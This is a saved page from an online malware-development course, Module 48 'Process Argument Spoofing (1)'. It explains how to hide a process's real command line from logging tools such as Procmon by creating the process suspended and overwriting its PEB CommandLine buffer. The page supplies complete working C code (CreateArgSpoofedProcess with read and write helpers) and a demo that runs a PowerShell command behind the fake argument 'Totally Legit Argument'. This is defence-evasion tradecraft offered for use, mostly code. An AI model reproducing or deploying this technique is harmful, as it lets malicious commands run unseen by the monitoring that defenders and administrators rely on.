<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Process%20Argument%20Spoofing%20(1)_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Process%20Argument%20Spoofing%20(1)_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Process%20Argument%20Spoofing%20(1)_files/css2.css" rel="stylesheet">
        <link href="Process%20Argument%20Spoofing%20(1)_files/css2_002.css" rel="stylesheet">
        <title>Process Argument Spoofing (1)</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Process%20Argument%20Spoofing%20(1)_files/app.fdbb573b.css"><link rel="stylesheet" href="Process%20Argument%20Spoofing%20(1)_files/app.fdbb573b.css"><link rel="stylesheet" href="Process%20Argument%20Spoofing%20(1)_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Process%20Argument%20Spoofing%20(1)_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 48 - Process Argument Spoofing (1)
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Process%20Argument%20Spoofing%20(1)_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Process%20Argument%20Spoofing%20(1)_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Process%20Argument%20Spoofing%20(1)_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/ArgSpoofing-1" target="_blank">
                    <img src="Process%20Argument%20Spoofing%20(1)_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Process Argument Spoofing (1)</h2>
<h3>Introduction</h3>
<p>Process argument spoofing is a technique used to conceal the command 
line argument of a newly spawned process in order to facilitate the 
execution of commands without revealing them to logging services, such 
as <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank">Procmon</a>.</p>
<p>The image below shows the command <code>powershell.exe -c calc.exe</code> being logged by Procmon. The objective of this module is to run <code>powershell.exe -c calc.exe</code> without it being successfully logged to Procmon.</p>
<p><img src="Process%20Argument%20Spoofing%20(1)_files/arg-spoof-109550005-441b53e8-9f32-48c3-96a5-56b5b7eb427a.png" alt="Image"></p>
<h3>PEB Review</h3>
<p>The first step to performing argument spoofing is to understand where
 the arguments are being stored inside the process. Recall the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" target="_blank">PEB structure</a> which was explained at the start of the course, it holds information about a process. To be more specific, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters" target="_blank">RTL_USER_PROCESS_PARAMETERS</a> structure inside the PEB contains the <code>CommandLine</code> member which holds the command line arguments. The <code>RTL_USER_PROCESS_PARAMETERS</code> structure is shown below.</p>
<pre><code>typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
</code></pre>
<p><code>CommandLine</code> is defined as a <a href="https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string" target="_blank">UNICODE_STRING</a>.</p>
<h3>UNICODE_STRING Structure</h3>
<p>The <code>UNICODE_STRUCTURE</code> structure is shown below.</p>
<pre><code>typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
</code></pre>
<p>The <code>Buffer</code> element will contain the contents of the 
command line arguments. With this in mind, it's possible to access the 
command line arguments using <code>PEB-&gt;ProcessParameters.CommandLine.Buffer</code> as a wide-character string.</p>
<h3>How To Spoof Process Arguments</h3>
<p>To perform spoofing of command line arguments, one must first create a
 target process in a suspended state, passing dummy arguments that are 
not considered suspicious. Before resuming the process, the <code>PEB-&gt;ProcessParameters.CommandLine.Buffer</code>
 string needs to be patched with the desired payload string, which will 
cause logging services to log the dummy arguments instead of the actual 
command line arguments that are going to be executed. To carry out this 
procedure, the following steps must be taken:</p>
<ol>
<li>
<p>Create the target process in a suspended state.</p>
</li>
<li>
<p>Get the remote <code>PEB</code> address of the created process.</p>
</li>
<li>
<p>Read the remote <code>PEB</code> structure from the created process.</p>
</li>
<li>
<p>Read the remote <code>PEB-&gt;ProcessParameters</code> structure from the created process.</p>
</li>
<li>
<p>Patch the string <code>ProcessParameters.CommandLine.Buffer</code>, and overwrite with the payload to execute.</p>
</li>
<li>
<p>Resume the process.</p>
</li>
</ol>
<p>The length of the payload argument written to <code>Peb-&gt;ProcessParameters.CommandLine.Buffer</code>
 at runtime must be smaller than or equal to the length of the dummy 
argument created during the suspended process creation. If the real 
argument is larger, it may overwrite bytes outside the dummy argument, 
resulting in the process crashing. To avoid this, always ensure that the
 dummy argument is larger than the argument that will be executed.</p>
<h3>Retrieving Remote PEB Address</h3>
<p>Retrieving the PEB address of the remote process requires the use of <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" target="_blank">NtQueryInformationProcess</a> with the <code>ProcessBasicInformation</code> flag.</p>
<p><img src="Process%20Argument%20Spoofing%20(1)_files/arg-spoof-209553208-efe6e1fb-2e03-4840-a1ff-821217ddf731.png" alt="image"></p>
<p>As noted in the documentation, when the <code>ProcessBasicInformation</code> flag is used, <code>NtQueryInformationProcess</code> will return a <code>PROCESS_BASIC_INFORMATION</code> structure that looks like this:</p>
<pre><code>typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS    ExitStatus;
    PPEB        PebBaseAddress;                // Points to a PEB structure.
    ULONG_PTR   AffinityMask;
    KPRIORITY   BasePriority;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
</code></pre>
<p>Note that since <code>NtQueryInformationProcess</code> is a syscall it needs to be called using <code>GetModuleHandle</code> and <code>GetProcAddress</code> as shown in previous modules.</p>
<h3>Reading Remote PEB Structure</h3>
<p>After retrieving the PEB address for the remote process, it's possible to read the PEB structure using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory" target="_blank">ReadProcessMemory</a> WinAPI which is shown below.</p>
<pre><code>BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
);
</code></pre>
<p><code>ReadProcessMemory</code> is used to read data from a specified address that is specified in the <code>lpBaseAddress</code> parameter. The function must be invoked twice:</p>
<ol>
<li>
<p>The first invocation is used to read the PEB structure by passing the PEB address obtained from <code>NtQueryInformationProcess</code>'s output. This is passed in the <code>lpBaseAddress</code> parameter.</p>
</li>
<li>
<p>It is then invoked a second time to read the <code>RTL_USER_PROCESS_PARAMETERS</code> structure, passing its address to the <code>lpBaseAddress</code> parameter. Note that <code>RTL_USER_PROCESS_PARAMETERS</code> is found within the PEB structure during the first invocation. Recall that this structure contains the <code>CommandLine</code> member which is required to perform argument spoofing.</p>
</li>
</ol>
<h4>RTL_USER_PROCESS_PARAMETERS Size</h4>
<p>When reading the <code>RTL_USER_PROCESS_PARAMETERS</code> structure, it is necessary to read more bytes than <code>sizeof(RTL_USER_PROCESS_PARAMETERS)</code>.
 This is because the real size of this structure depends on the dummy 
argument's size. To ensure the entire structure is read, additional 
bytes should be read. This is done in the code sample where an 
additional 225 bytes are read.</p>
<h3>Patching CommandLine.Buffer</h3>
<p>Having obtained the <code>RTL_USER_PROCESS_PARAMETERS</code> structure, it's possible to access and patch <code>CommandLine.Buffer</code>. To do so, <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank">WriteProcessMemory</a> WinAPI will be used, which is shown below.</p>
<pre><code>BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,          // What is being overwritten (CommandLine.Buffer)
  [in]  LPCVOID lpBuffer,               // What is being written (new process argument)
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
</code></pre>
<ul>
<li>
<p><code>lpBaseAddress</code> should be set to what is being overwritten, which in this case is <code>CommandLine.Buffer</code>.</p>
</li>
<li>
<p><code>lpBuffer</code> is the data that will be overwriting the dummy arguments. It should be a wide char string to replace <code>CommandLine.Buffer</code> which is also a wide char string.</p>
</li>
<li>
<p>The <code>nSize</code> parameter is the size of the buffer to write in <em>bytes</em>. It should be equal to the length of the string that's being written multiplied by the size of <code>WCHAR</code> plus 1 (for the null character).</p>
</li>
</ul>
<pre><code>lstrlenW(NewArgument) * sizeof(WCHAR) + 1
</code></pre>
<h3>Helper Functions</h3>
<p>The code in this module makes use of two helper functions that read and write from and to the target process.</p>
<h4>ReadFromTargetProcess Function</h4>
<p>The <code>ReadFromTargetProcess</code> helper function will return an
 allocated heap that contains the buffer read from the target process. 
First it will read the PEB structure and then use it to retrieve the <code>RTL_USER_PROCESS_PARAMETERS</code> structure. The <code>ReadFromTargetProcess</code> function is shown below.</p>
<pre><code>BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead	= NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
	
	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &amp;sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h4>WriteToTargetProcess Function</h4>
<p>The <code>WriteToTargetProcess</code> helper function will pass the appropriate parameters to <code>WriteProcessMemory</code> and check the output. The <code>WriteToTargetProcess</code> function is shown below.</p>
<pre><code>BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten	= NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &amp;sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h3>Process Argument Spoofing Function</h3>
<p><code>CreateArgSpoofedProcess</code> is a function that performs argument spoofing on a newly created process. The function requires 5 arguments:</p>
<ul>
<li>
<p><code>szStartupArgs</code> - The dummy arguments. These should be benign.</p>
</li>
<li>
<p><code>szRealArgs</code> - The real arguments to execute.</p>
</li>
<li>
<p><code>dwProcessId</code> - A pointer to a DWORD that receives the PID.</p>
</li>
<li>
<p><code>hProcess</code> - A pointer to a HANDLE that receives the process handle.</p>
</li>
<li>
<p><code>hThread</code> - A pointer to a DWORD that receives the process's thread handle.</p>
</li>
</ul>
<pre><code>BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS                      STATUS   = NULL;

	WCHAR                         szProcess [MAX_PATH];

	STARTUPINFOW                  Si       = { 0 };
	PROCESS_INFORMATION           Pi       = { 0 };

	PROCESS_BASIC_INFORMATION     PBI      = { 0 };
	ULONG                         uRetern  = NULL;

	PPEB                          pPeb     = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;


	RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// Getting the address of the NtQueryInformationProcess function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) 
		return FALSE;


	lstrcpyW(szProcess, szStartupArgs);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,      // creating the process suspended &amp; with no window
		NULL,
		L"C:\\Windows\\System32\\",               // we can use GetEnvironmentVariableW to get this Programmatically
		&amp;Si,
		&amp;Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	// Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &amp;PBI, sizeof(PROCESS_BASIC_INFORMATION), &amp;uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	// Reading the PEB structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &amp;pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	// Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
	// Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
	// 0xFF is 255 but it can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb-&gt;ProcessParameters, &amp;pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// Writing the real argument to the process
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms-&gt;CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}


	// Cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// Resuming the process with the new paramters
	ResumeThread(Pi.hThread);

	// Saving output parameters
	*dwProcessId     = Pi.dwProcessId;
	*hProcess        = Pi.hProcess;
	*hThread         = Pi.hThread;

	// Checking if everything is valid
	if (*dwProcessId != NULL, *hProcess != NULL &amp;&amp; *hThread != NULL)
		return TRUE;

	return FALSE;
}

</code></pre>
<h3>Demo</h3>
<p><code>powershell.exe Totally Legit Argument</code> is the dummy argument that will be logged whereas <code>powershell.exe -c calc.exe</code> is the payload that is executed.</p>
<p><img src="Process%20Argument%20Spoofing%20(1)_files/arg-spoof-309567835-eed3b698-80d0-4a39-ae98-7d2f4120a9a3.png" alt="Image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Familiarize yourself with the NtQueryInformationProcess NtAPI function and its parameters</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Verify whether command line argument spoofing works against Process Hacker</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/47"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/48/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/48/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/49"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Process%20Argument%20Spoofing%20(1)_files/jquery-3.6.0.min.js"></script>
        <script src="Process%20Argument%20Spoofing%20(1)_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Process%20Argument%20Spoofing%20(1)_files/app.4474f4d1.css"><link rel="modulepreload" href="Process%20Argument%20Spoofing%20(1)_files/app.5f3af5ce.js"><link rel="stylesheet" href="Process%20Argument%20Spoofing%20(1)_files/app.4474f4d1.css"><script type="module" src="Process%20Argument%20Spoofing%20(1)_files/app.5f3af5ce.js"></script><script src="Process%20Argument%20Spoofing%20(1)_files/navbar.js"></script>
<script src="Process%20Argument%20Spoofing%20(1)_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 48;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>